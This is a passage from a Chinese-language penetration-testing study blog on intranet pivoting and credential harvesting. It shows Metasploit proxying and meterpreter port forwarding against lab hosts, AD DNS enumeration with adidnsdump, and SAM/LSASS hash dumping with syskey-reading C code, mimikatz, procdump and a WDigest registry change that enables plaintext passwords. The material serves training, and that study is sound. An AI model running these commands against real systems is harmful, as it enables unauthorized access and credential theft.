<p><strong>工具穿透</strong></p>
<p><strong>Metasploit</strong></p>
<p>当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。[若socks5设置口令，可结合proxychains]</p>
<pre><code># sudo msfconsole -q

msf5 &gt; setg proxies socks5:frp.xxxx.online:9066

msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010

msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 10

msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.144.178

msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928142701558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>Windows</strong></p>
<p>Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果<br>
<img src="https://img-blog.csdnimg.cn/20200928142723220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>小结</strong></p>
<p>Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“做菜的肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等</p>
<pre><code>https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&amp;mid=2247485563&amp;idx=2&amp;sn=1163136fa1e407bef053a7ce8c6f1fb4&amp;chksm=fc3fb17acb48386c0d41802ee5f2e1469d192422d80c1b03ed476beec419c43e06e341621a26&amp;scene=21    ---AnonySec 感谢大佬
</code></pre>
<hr>
<h2><a id="42_ported_7596"></a>4.2 基于ported端口转发</h2>
<p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且内置于meterpreter。其中exe单版本源码如下：</p>
<pre><code>https://github.com/rssnsj/portfwd
</code></pre>
<p><strong>攻击机：</strong></p>
<pre><code>192.168.1.5 Debian
</code></pre>
<p><strong>靶机：</strong></p>
<pre><code>192.168.1.4 Windows 7

192.168.1.119 Windows 2003
</code></pre>
<pre><code>msf exploit(multi/handler) \&gt; sessions ‐l 

Active sessions
===============

Id Name Type Information Connection
‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐
1 meterpreter x86/windows WIN03X64\Administrator @ WIN03X64 192.168.1.5:45303 ‐&gt; 192.168.1.119:53 (192.168.1.119)

msf exploit(multi/handler) &gt; sessions ‐i 1 ‐c 'ipconfig'
[*] Running 'ipconfig' on meterpreter session 1 (192.168.1.119) 

Windows IP Configuration 

Ethernet adapter 本地连接:

Connection‐specific DNS Suffix . :

IP Address. . . . . . . . . . . . : 192.168.1.119
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.1.1 22
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928145808171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机IP为：</strong><br>
192.168.1.119—windows 2003—x64</p>
<p>需要转发端口为：80，3389</p>
<pre><code>msf exploit(multi/handler) &gt; sessions ‐i 1
[*] Starting interaction with 1... 

meterpreter &gt; shell
Process 4012 created.
Channel 56 created.
Microsoft Windows [版本 5.2.3790]
(C) 版权所有 1985‐2003 Microsoft Corp.

C:\Documents and Settings\Administrator\桌面&gt;if defined PSModulePath (echo ok!) else (echo sorry!)
if defined PSModulePath (echo ok!) else (echo sorry!)
sorry! 

C:\Documents and Settings\Administrator\桌面&gt;net config Workstation
net config Workstation
计算机名 \\WIN03X64
计算机全名 win03x64
用户名 Administrator

工作站正运行于
NetbiosSmb (000000000000)
NetBT_Tcpip_{37C12280‐A19D‐4D1A‐9365‐6CBF2CAE5B07} (000C2985D67D) 

软件版本 Microsoft Windows Server 2003

工作站域 WORKGROUP
登录域 WIN03X64

COM 打开超时 (秒) 0
COM 发送计数 (字节) 16
COM 发送超时 (毫秒) 250
命令成功完成。

C:\Documents and Settings\Administrator\桌面&gt;netstat ‐an|findstr "LIST ENING"
netstat ‐an|findstr "LISTENING"
TCP 0.0.0.0:80 0.0.0.0:0 LISTENING
TCP 0.0.0.0:135 0.0.0.0:0 LISTENING
TCP 0.0.0.0:445 0.0.0.0:0 LISTENING
TCP 0.0.0.0:1025 0.0.0.0:0 LISTENING
TCP 0.0.0.0:1026 0.0.0.0:0 LISTENING
TCP 0.0.0.0:3078 0.0.0.0:0 LISTENING
TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING
TCP 0.0.0.0:9001 0.0.0.0:0 LISTENING
TCP 127.0.0.1:2995 0.0.0.0:0 LISTENING
TCP 127.0.0.1:9000 0.0.0.0:0 LISTENING
TCP 127.0.0.1:9999 0.0.0.0:0 LISTENING
TCP 192.168.1.119:139 0.0.0.0:0 LISTENING
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020092814585888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>meterpreter &gt; portfwd ‐h
Usage: portfwd [‐h] [add | delete | list | flush] [args] 

OPTIONS:
‐L &lt;opt&gt; Forward: local host to listen on (optional). Reverse: local host to connect to.
‐R Indicates a reverse port forward.
‐h Help banner.
‐i &lt;opt&gt; Index of the port forward entry to interact with (see the "list" command).
‐l &lt;opt&gt; Forward: local port to listen on. Reverse: local port to connect to.
‐p &lt;opt&gt; Forward: remote port to connect to. Reverse: remote port to listen on.
‐r &lt;opt&gt; Forward: remote host to connect to.
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928145923697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>攻击机执行：</strong></p>
<pre><code>meterpreter &gt; portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389
[*] Local TCP relay created: :33389 &lt;‐&gt; 192.168.1.119:3389
meterpreter &gt; portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80
[*] Local TCP relay created: :30080 &lt;‐&gt; 192.168.1.119:80
meterpreter &gt; portfwd 

Active Port Forwards
==================== 
Index Local Remote Direction
‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐
1 0.0.0.0:33389 192.168.1.119:3389 Forward
2 0.0.0.0:30080 192.168.1.119:80 Forward 

2 total active port forwards.
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928145955245.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200928150008858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查看攻击机LISTEN端口：转发已成功</p>
<pre><code>root@John:~# netstat ‐ntlp |grep :3
tcp 0 0 0.0.0.0:33389 0.0.0.0:* LISTEN 2319/ruby
tcp 0 0 0.0.0.0:30080 0.0.0.0:* LISTEN 2319/ruby 4
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928150042925.png#pic_center" alt="在这里插入图片描述"><br>
Windows 7 分别访问攻击机33389，30080，既等价访问靶机3389，80<br>
<img src="https://img-blog.csdnimg.cn/20200928150059802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200928150108266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://micro8.gitbook.io/micro8/contents-1/91-100/95-ji-yu-portfwd-duan-kou-zhuan-fa
</code></pre>
<hr>
<h2><a id="43_Venom_7747"></a>4.3 Venom-代理转发、多级穿透</h2>
<pre><code>https://www.ms509.com/2020/06/17/Intranet-penetration/   --非常详细全面的内网穿透技术总结

https://blog.csdn.net/u011215939/article/details/103403545

https://xz.aliyun.com/t/4058   --Venom 渗透测试人员的多级代理

http://www.vkxss.top/2020/04/30/内网渗透-Venom内网工具使用实战/
</code></pre>
<hr>
<h2><a id="44_DNSdayuThirteenth_Day_7759"></a>4.4 DNS隧道（dayu-Thirteenth Day）</h2>
<h2><a id="441_dnsdns2tcp_7760"></a>4.4.1 dns隧道之dns2tcp</h2>
<pre><code>http://blog.dengxj.com/archives/14/

https://mntn0x.github.io/2020/03/24/DNS隧道搭建/

https://blog.werner.wiki/building-a-dns-tunnel-with-dns2tcp/   --使用dns2tcp搭建DNS隧道(老文章思路）
</code></pre>
<p>书里的思路也很好…</p>
<hr>
<h2><a id="442_dnsdnscat2_7772"></a>4.4.2 dns隧道之dnscat2</h2>
<pre><code>https://www.4hou.com/posts/PY0A   --DNScat2工具:通过DNS进行C&amp;C通信

https://blog.csdn.net/weixin_41598660/article/details/106658548   --最新复现文章
</code></pre>
<h2><a id="443_dnsIodine_7780"></a>4.4.3 dns隧道之Iodine</h2>
<pre><code>https://zhuanlan.zhihu.com/p/70263701

https://juejin.im/post/6844903767461068807
</code></pre>
<p>书上介绍了MSF配合lodine使用方法…</p>
<h2><a id="444_dnsmsfdnscat2_7789"></a>4.4.4 使用dns协议上线msf之dnscat2</h2>
<pre><code>https://cloud.tencent.com/developer/article/1672113 
</code></pre>
<p>书上介绍了MSF配合dnscat2使用方法…</p>
<h2><a id="445__dnsmsfdns2tcp_7796"></a>4.4.5  使用dns协议上线msf之dns2tcp</h2>
<p>这里只能看书了，这里树上很精彩，后期我会复现…</p>
<hr>
<p>总结：</p>
<pre><code>https://xz.aliyun.com/t/7701      --第四章总结工具文章

http://www.feidao.site/wordpress/index.php/2020/04/11/yingyong/#toc-head-13  --好好看完

https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf
</code></pre>
<hr>
<h1><a id="_7810"></a>五、内部信息收集</h1>
<h2><a id="51__7811"></a>5.1 本地信息搜集</h2>
<h2><a id="511_DNS_7812"></a>5.1.1 用普通权限的域帐户获得域环境中所有DNS解析记录</h2>
<p>在讲解本文之前，先介绍一下域账户和DNS的几个基本概念。</p>
<p><strong>域账户</strong></p>
<p>域账户是域是网络对象的分组。例如：用户、组和计算机。域中所有的对象都存储在 Active Directory （AD）下。Active Directory 可以常驻在某个域中的一个或多个域控制器下。</p>
<p><strong>什么是DNS？</strong></p>
<p>DNS( Domain Name System)是“域名系统”的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，它用于TCP/IP网络，它所提供的服务是用来将服务器名和域名转换为IP地址的工作，DNS就是这样的一位“翻译官”。</p>
<p><strong>为什么需要DNS解析域名为IP地址？</strong></p>
<p>网络通讯大部分是基于TCP/IP的，而TCP/IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，而不能认识域名。我们无法记住10个以上IP地址的网站，所以我们访问网站时，更多的是在浏览器地址栏中输入域名，就能看到所需要的页面，这是因为有一个叫“DNS服务器”的计算机自动把我们的域名“翻译”成了相应的IP地址，然后调出IP地址所对应的网页。</p>
<p><strong>DNS域传送（DNS zone transfer）</strong></p>
<p>DNS域传送漏洞是黑客常用的一种漏洞攻击手段，黑客可以用该漏洞快速的判定出某个特定zone的所有服务器，收集域信息，选择攻击目标，找出未使用的IP地址，黑客可以绕过基于网络的访问控制。</p>
<p><strong>DNS域传送漏洞原理</strong></p>
<p>DNS域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。</p>
<p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主服务器和备份服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>一般来说，DNS域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的网络用户执行DNS域传送（zone transfer）操作是后果最为严重的错误配置之一。</p>
<p>综上所述，要实现域传送漏洞，就需要一个不安全配置的DNS服务器，然后网络上的任何用户都可以获取所有传送记录并收集有关网络中服务器的信息。然而，目前还很少有人知道，如果使用Active Directory集成DNS，任何用户都可以默认查询所有DNS记录。</p>
<p>本文，我会给你介绍了一个默认查询所有DNS记录的工具–<a href="https://github.com/dirkjanm/adidnsdump">Adidnsdump</a> ，即使你是一个没有读取传送记录权限的用户，也可以使用以下方法获得域环境中的所有DNS解析记录。</p>
<p><strong>具体获取过程</strong></p>
<p>就我个人而言，每当我接手一个新的渗透测试任务时，我都会想法设法了解测试环境的网络布局，测试对象使用的软件以及有趣数据的位置。如果测试对象有非描述性服务器名称或描述，像BloodHound或ldapdomaindump这样的工具不会有太大帮助，因为SRV00001.company.local仍然没有告诉你在这台服务器上运行的是什么。在大量IP地址上运行EyeWitness等发现工具通常会返回大量默认的Apache / IIS页面，因为大多数站点都配置为侦听DNS名称而不是IP地址。此时你如果知道DNS记录，可能就会发现SRV00001.company.local和gitlab.company.local指向同一个IP，这个IP上可能存放着大量源码。</p>
<p>因此，我认为访问AD的DNS记录非常有价值。为此我编写了一个可以转储这些DNS记录的Adidnsdump。你既可以直接在网络中的主机运行它，也可以通过SOCKS隧道利用。</p>
<p>该工具的设计思路，是在我研究Active Directory DNS时开始的，主要受到Kevin Robertson在<a href="https://room362.com/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">ADIDNS</a> 上工作的启发。当我作为普通用户提取了ADSI Edit并突然看到了域中所有DNS记录时，我试图找出AD如何在LDAP中使用域来存储DNS记录。令我惊讶的是，早在2013年，就有人开发出可以提取DNS记录的<a href="https://blog.netspi.com/exploiting-adidns/">PowerShell</a>脚本，但它并没有完全符合我的要求，所以我决定用Python编写一个版本，并添加一些选项来枚举比默认情况下更多的记录。</p>
<p><strong>DNS记录到底隐藏在哪了？</strong></p>
<p>在LDAP中查询DNS记录的主要方法是选择dnsNode类的所有对象，然后执行查询操作，此时，你会看到DNS域中的所有记录。当我使用filter (objectClass=dnsNode)执行查询时，返回的结果非常有限。即使我手动浏览DNS域，都可以获取更多的记录。<br>
<img src="https://img-blog.csdnimg.cn/20200929164906765.png#pic_center" alt="在这里插入图片描述"><br>
如上图所示，很多记录的objectClass都处于隐藏状态，我想是因为计算机DNS记录的默认权限所导致的。这让我联想到了，不是通过活动目录DNS页面创建的其他记录，也是不会允许所有用户查看其内容的。再加上IP地址实际作为这些对象的属性来存储，因此无法查看这些记录中的IP地址。</p>
<p>但是，默认情况下，任何用户都可以创建新的DNS记录，任何用户也可以默认列出DNS域的子对象。至此，我们就知道DNS解析记录藏在哪儿了，只是无法使用LDAP查询它们而已。<br>
<img src="https://img-blog.csdnimg.cn/2020092916493121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过使用LDAP枚举知道记录所在的位置之后，我们就可以直接使用DNS查询它，因为执行常规DNS查询不需要什么特别权限，这样我们就可以解析域中的所有记录。</p>
<p><strong>使用adidnsdump查询所有DNS解析记录</strong></p>
<p>点此<a href="https://github.com/dirkjanm/adidnsdump">GitHub</a>，下载adidnsdump，它可以枚举DNS域中的所有解析记录。首先，使用参数–print-zones显示当前域中的所有区域。注意，并非所有的区域都有实际意义，例如转发（forward ）、缓存和存根域并不包含该域的所有记录。如果找到这些域，最好查询它们实际所属的域。在我构建的测试域中，使用参数–print-zones只会输出默认域。<br>
<img src="https://img-blog.csdnimg.cn/20200929165025791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果我们为adidnsdump指定域或者将默认域设置为空，我们将获得一个包含所有解析记录的列表。可以列出但不能读取的记录(即上述所谓的“隐藏”DNS记录)只会显示一个问号，因为不知道其中会存在哪种类型的记录以及它们指向何处。另外，这些记录会全部被保存到名为records.csv的文件中。<br>
<img src="https://img-blog.csdnimg.cn/20200929165040250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
要解析这些未知记录，可使用参数-r，该标志将对所有未知记录执行A查询（如果你在IPv6网络中，则可以在代码中轻松将其更改为AAAA），之前的?都会显示出具体的记录内容。<img src="https://img-blog.csdnimg.cn/20200929165057836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果你没有直接连接但通过代理工作，则可以通过socks代理该工具，并使用–dns-tcp标志通过TCP执行DNS查询。</p>
<p><strong>缓解措施</strong></p>
<p>为了安全起见，我建议你首先要对DNS记录的安全性持有客观的认知态度。如果你确实要隐藏DNS记录，就请删除“Everyone”和“Pre-Windows 2000 Compatible Access”的“列出内容”权限，以阻止普通用户查询DNS记录。但这可能会产生负面影响，所以我不建议那样做。</p>
<p>所以最好的办法是及时检测DNS查询活动的出现，通过监控大量DNS查询或启用对DNS区域列表的审计可能是一种更好的缓解措施。</p>
<p>adidnsdump可以通过<a href="https://github.com/dirkjanm/adidnsdump">GitHub</a> 和PyPI（pip install adidnsdump）安装使用，现在，该工具仅将获取的记录转储到CSV文件。不过，你可以自己把文件转换为其他格式。</p>
<p>参考文章：</p>
<pre><code>https://beta.4hou.com/web/17955.html  --原文

https://nosec.org/home/detail/2527.html
</code></pre>
<hr>
<h2><a id="512_TokenSession_7887"></a>5.1.2 令牌Token和会话Session原理与攻略</h2>
<pre><code>https://www.cnblogs.com/huangsheng/p/10736796.html
</code></pre>
<h2><a id="513_hash_7892"></a>5.1.3 内存转储-获取本地hash</h2>
<p><strong>原理分析</strong></p>
<p>Windows的对每个用户生成密码的hash值，数据存储在注册表的HKLMSAM中。密钥存储在HKLMSYSTEM中。</p>
<p><strong>从SAM数据库中获取密码hash，需要SYSTEM中的syskey</strong></p>
<p>1、读取HKLMSYSTEM中的syskey</p>
<p>syskey由目录</p>
<pre><code>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsa
</code></pre>
<p><code>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsa</code>下JD、Skew1、GBG和Data等键值中的内容拼接而成</p>
<p><strong>获取代码如下：</strong></p>
<pre><code>int CRYPT_SyskeyGetValue(s_SYSKEY *pSyskey) {

    DWORD dwSecureBoot=0;

    BYTE syskey[16];

    BYTE syskeyPerm[16]={0x8,0x5,0x4,0x2,0xb,0x9,0xd,0x3,0x0,0x6,0x1,0xc,0xe,0xa,0xf,0x7};

    int i;



    if(!RegGetValueEx(HKEY_LOCAL_MACHINE,”SYSTEM\CurrentControlSet\Control\Lsa”,”SecureBoot”,NULL,&amp;dwSecureBoot,sizeof(dwSecureBoot),NULL))

        return SYSKEY_REGISTRY_ERROR;



    if(dwSecureBoot != 1)

        return SYSKEY_METHOD_NOT_IMPL;



    if(!SyskeyGetClassBytes(HKEY_LOCAL_MACHINE,”SYSTEM\CurrentControlSet\Control\Lsa”,”JD”,syskey))

        return SYSKEY_REGISTRY_ERROR;



    if(!SyskeyGetClassBytes(HKEY_LOCAL_MACHINE,”SYSTEM\CurrentControlSet\Control\Lsa”,”Skew1″,syskey+4))

        return SYSKEY_REGISTRY_ERROR;



    if(!SyskeyGetClassBytes(HKEY_LOCAL_MACHINE,”SYSTEM\CurrentControlSet\Control\Lsa”,”GBG”,syskey+8))

        return SYSKEY_REGISTRY_ERROR;



    if(!SyskeyGetClassBytes(HKEY_LOCAL_MACHINE,”SYSTEM\CurrentControlSet\Control\Lsa”,”Data”,syskey+12))

        return SYSKEY_REGISTRY_ERROR;



    for(i=0;i&lt;16;i++)

        pSyskey-&gt;key[i] = syskey[syskeyPerm[i]];



    return SYSKEY_SUCCESS;
</code></pre>
<p>2、使用syskey解密HKLMSAM</p>
<p>获得</p>
<pre><code>HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers
</code></pre>
<p>中每个用户的F和V的键值内容，使用syskey进行解密</p>
<p><strong>离线读取sam数据库</strong><br>
1、导出数据库</p>
<pre><code class="prism language-c">方法一（注册表）：

reg save HKLMSYSTEM c<span class="token punctuation">:</span>usersuserdesktopSYSTEM

reg save HKLMSAM c<span class="token punctuation">:</span>usersuserdesktopSAM

方法二（复制文件）：

存放路径

C<span class="token punctuation">:</span>WindowsSystem32configSYSTEM

C<span class="token punctuation">:</span>WindowsSystem32configSAM

因为正常内存中可能无法被打开
</code></pre>
<p>2、使用mimikatz导出用户hash</p>
<pre><code class="prism language-c">lsadump<span class="token punctuation">:</span><span class="token punctuation">:</span>sam <span class="token operator">/</span>sam<span class="token punctuation">:</span>sam <span class="token operator">/</span>system<span class="token punctuation">:</span>system
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200929174051797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>目标机器直接读取</strong></p>
<p>根据目标相应位数传入mimi，管理员权限启动mimikatz</p>
<pre><code class="prism language-c">privilege<span class="token punctuation">:</span><span class="token punctuation">:</span>debug

token<span class="token punctuation">:</span><span class="token punctuation">:</span>elevate

lsadump<span class="token punctuation">:</span><span class="token punctuation">:</span>sam
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200929174120871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>使用procdump.exe进行内存转储</strong></p>
<p>作用：</p>
<p>微软维护工具，主要使用它来进行内存转储。Windows在运行的时候不能复制SYSTEM和SAM文件。</p>
<p>该方法只能在Window 2003、Windows 2008、Windows 2008 R2，且没有打补丁（KB2871997）的情况下可以获取该系统在未清理内存（意为未重启）时存储的登录信息凭证。</p>
<p>Windows 2012及以上版本需要开启注册表记录明文密码，方可转储。</p>
<p>方法：</p>
<pre><code class="prism language-c">HKLM<span class="token punctuation">:</span>SYSTEMCurrentControlSetControlSecurityProvidersWDigest的”UseLogonCredential”设置为<span class="token number">1</span>，型为DWORD <span class="token number">32</span>�
</code></pre>
<p>cmd修改：</p>
<pre><code class="prism language-c">reg add HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSecurityProvidersWDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">1</span>
</code></pre>
<p>powershell修改：</p>
<pre><code class="prism language-c">PS C<span class="token punctuation">:</span><span class="token operator">&gt;</span> New<span class="token operator">-</span>ItemProperty <span class="token operator">-</span>Path HKLM<span class="token punctuation">:</span>SYSTEMCurrentControlSetControlSecurityProvidersWDigest <span class="token operator">-</span>Name UseLogonCredential <span class="token operator">-</span>Type DWORD <span class="token operator">-</span>Value <span class="token number">1</span>
</code></pre>
<p>procdump语法：</p>
<pre><code class="prism language-c">procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>accepteula <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe c<span class="token punctuation">:</span>windowstapia<span class="token punctuation">.</span>dmp
</code></pre>
<p><strong>图形界面转储</strong><br>
<img src="https://img-blog.csdnimg.cn/20200929174530851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>MIMIKATZ-SEKURLSA::LogonPasswords</strong><br>
语法：</p>
<pre><code class="prism language-c">privilege<span class="token punctuation">:</span>debug     # 设置权限

sekurlsa<span class="token punctuation">:</span><span class="token punctuation">:</span>minidump lsass<span class="token punctuation">.</span>dmp    # 选择要读出的内存文件

sekurlsa<span class="token punctuation">:</span>logonpasswords  # 获取密码
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200929174657274.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200929174747281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>后记</strong></p>
<p>其实获取本地hash还有很多工具可以利用，这边分享的是比较通用的方法</p>
<p>参考文章：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>secwk<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">/</span><span class="token number">09</span><span class="token operator">/</span><span class="token number">08</span><span class="token operator">/</span><span class="token number">6372</span><span class="token operator">/</span>
</code></pre>
<hr>
<h2><a id="514__8080"></a>5.1.4 转储域账户哈希值</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>scarletf<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">/</span><span class="token number">09</span><span class="token operator">/</span><span class="token number">03</span><span class="token operator">/</span>域渗透<span class="token operator">-</span>导出域用户Hash方法<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">2527</span>   <span class="token operator">--</span><span class="token operator">-</span>如何Dump域内的Hash

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1165439</span>   <span class="token operator">--</span>导出域内用户hash的几种方法
</code></pre>
<p>这几种方法，结合下思想<br>
然后书中的两个续集思路…</p>
<hr>
<h2><a id="515_SPNdayuFourteenth_day_8093"></a>5.1.5 SPN发现与利用（dayu-Fourteenth day）</h2>
<p><strong>关于SPN</strong></p>
<p>服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。通过SPN，可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作</p>
<p><strong>SPN格式</strong><br>
<img src="https://img-blog.csdnimg.cn/20200929224906428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
服务类和FQDN是必需参数，端口和服务名是可选的。</p>
<p><strong>setspn</strong></p>
<p>setspn是系统自带的查找和设置spn的命令</p>
<p>1、列出注册的spn<br>
<img src="https://img-blog.csdnimg.cn/20200929224934773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参数接受计算机名或者用户名。</p>
<p>2、配置spn<br>
<img src="https://img-blog.csdnimg.cn/20200929224955319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
3、在指定的域或林上查询SPN<br>
